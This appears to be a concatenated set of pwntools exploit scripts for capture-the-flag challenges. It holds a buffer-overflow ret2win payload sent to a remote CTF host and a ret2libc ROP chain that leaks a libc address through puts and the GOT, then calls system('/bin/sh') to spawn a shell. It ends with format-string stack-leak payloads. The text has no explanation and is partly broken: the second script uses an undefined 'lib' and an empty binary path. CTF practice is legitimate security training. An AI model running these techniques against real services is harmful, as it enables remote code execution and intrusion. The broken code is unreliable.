from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('chal')
r= e.process()
r = remote('gold.b01le.rs', 4004)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

win = 0x4011DD
r.sendline(b"a")
r.sendline(b"b")
r.sendline(b"c")
payload = b"a"*0x40+b"b"*8
payload+= flat(win)
pause()
r.sendlineafter(b"LAY A GAME?\n",payload)

r.interactive()
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('')
r= e.process()
# r = remote('challs.n00bzunit3d.xyz', 42450)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

main=0x4011DB
pop_rdi_ret=0x0000000000401232
ret=0x000000000040101a
setvbuf_got = 0x404028
puts_plt = 0x401060

payload = b"a"*32+b"b"*8
payload+= flat(pop_rdi_ret, setvbuf_got, puts_plt, main)
pause()
r.sendlineafter(b" a flag?\n",payload)
r.recvline()

setvbuf_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("setvbuf_libc: %#x" %setvbuf_libc)
base_libc = setvbuf_libc - lib.sym.setvbuf
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)

# ------------------------------

payload = b"a"*32+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendlineafter(b" a flag?\n",payload)

r.interactive()
%6$p-%7$p-%8$p-%9$p-%10$p-%11$p
%12$p-%6$p-%10$p-%15$p-%11$p
%12$p-%13$p-%14$p-%15$p-%16$p